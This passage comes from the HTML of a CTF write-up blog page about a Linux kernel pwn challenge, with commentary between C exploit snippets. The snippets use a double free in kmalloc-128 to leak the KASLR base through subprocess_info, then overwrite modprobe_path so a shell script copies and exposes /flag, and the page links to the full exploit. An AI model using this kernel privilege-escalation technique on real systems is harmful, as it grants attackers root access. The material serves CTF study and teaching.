+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>puts</span>(<span style=color:#9ece6a>&#34;[!] failed to get adjacent chunk&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#7aa2f7>exit</span>(EXIT_FAILURE);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;[o] adjacent chunk 7 &lt;--&gt; %d</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, pos);
+</span></span></code></pre></div><p>Trigger a double free, then add another data. The next allocation of kmalloc-128 should live on top of our last created chunk. I choose <code>subprocess_info</code> struct to get a leak of kernel base and <code>modprobe_path</code> pointer.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#414868;font-style:italic>// *double free*
+</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>del</span>(pos);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>memset</span>(buffer, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> idx <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#7aa2f7>add</span>(buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// populate a kmalloc-128 struct (subprocess_info)
+</span></span></span><span style=display:flex><span><span style=color:#414868;font-style:italic>// which should live on top of our last created chunk
+</span></span></span><span style=display:flex><span><span style=color:#7aa2f7>socket</span>(<span style=color:#e0af68>22</span>, AF_INET, <span style=color:#e0af68>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>view</span>(idx, <span style=color:#e0af68>0x80</span>, buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uintptr_t</span> kaslr <span style=color:#9ece6a;font-weight:700>=</span> a64[<span style=color:#e0af68>3</span>] <span style=color:#9ece6a;font-weight:700>-</span> <span style=color:#e0af68>0x7e470</span>;
+</span></span><span style=display:flex><span><span style=color:#bb9af7>const</span> <span style=color:#41a6b5>uintptr_t</span> modprobe_path <span style=color:#9ece6a;font-weight:700>=</span> a64[<span style=color:#e0af68>5</span>];
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;[o] kaslr %p</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, (<span style=color:#41a6b5>void</span> <span style=color:#9ece6a;font-weight:700>*</span>)kaslr);
+</span></span><span style=display:flex><span><span style=color:#7aa2f7>printf</span>(<span style=color:#9ece6a>&#34;[o] modprobe_path %p</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>, (<span style=color:#41a6b5>void</span> <span style=color:#9ece6a;font-weight:700>*</span>)modprobe_path);
+</span></span></code></pre></div><p>Then we can overwrite fd to get an allocation on <code>modprobe_path</code> and overwrite <code>modprobe_path</code> to do modprobe_path exploit.</p><div class=highlight><pre tabindex=0 style=color:#c0caf5;background-color:#1a1b26;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#41a6b5>void</span> <span style=color:#7aa2f7>prepare_modprobe_path_exploit</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;echo -ne &#39;#!/bin/sh</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>/bin/cp /flag /home/user/flag</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>/bin/chmod &#34;</span>
+</span></span><span style=display:flex><span>         <span style=color:#9ece6a>&#34;777 /home/user/flag&#39; &gt; /home/user/modprobe&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;chmod +x /home/user/modprobe&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;echo -ne &#39;</span><span style=color:#7aa2f7>\\</span><span style=color:#9ece6a>xff</span><span style=color:#7aa2f7>\\</span><span style=color:#9ece6a>xff</span><span style=color:#7aa2f7>\\</span><span style=color:#9ece6a>xff</span><span style=color:#7aa2f7>\\</span><span style=color:#9ece6a>xff&#39; &gt; /home/user/dummy&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;chmod +x /home/user/dummy&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#41a6b5>int</span> <span style=color:#7aa2f7>main</span>(<span style=color:#41a6b5>int</span> argc, <span style=color:#41a6b5>char</span> <span style=color:#9ece6a;font-weight:700>*</span>argv[]) {
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>prepare_modprobe_path_exploit</span>();
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>del</span>(idx);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// overwrite fd to modprobe_path
+</span></span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(buffer, <span style=color:#e0af68>0xec</span>, <span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>  a64[<span style=color:#e0af68>8</span>] <span style=color:#9ece6a;font-weight:700>=</span> modprobe_path;
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>add</span>(buffer);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>add</span>(buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// overwrite modprobe_path
+</span></span></span><span style=display:flex><span>  <span style=color:#7aa2f7>memset</span>(buffer, <span style=color:#e0af68>0</span>, <span style=color:#bb9af7>sizeof</span>(data_s));
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>strcpy</span>(buffer, <span style=color:#9ece6a>&#34;/home/user/modprobe&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>add</span>(buffer);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#414868;font-style:italic>// trigger modprobe_path
+</span></span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;/home/user/dummy&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#7aa2f7>system</span>(<span style=color:#9ece6a>&#34;cat /home/user/flag&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#bb9af7>return</span> <span style=color:#e0af68>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The full exploit code can be found here, <a href=https://gist.github.com/circleous/458f7c691b79dfbebc2930bff9d78353>https://gist.github.com/circleous/458f7c691b79dfbebc2930bff9d78353</a></p><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li><li><a href=/tags/kernel/>Kernel</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>
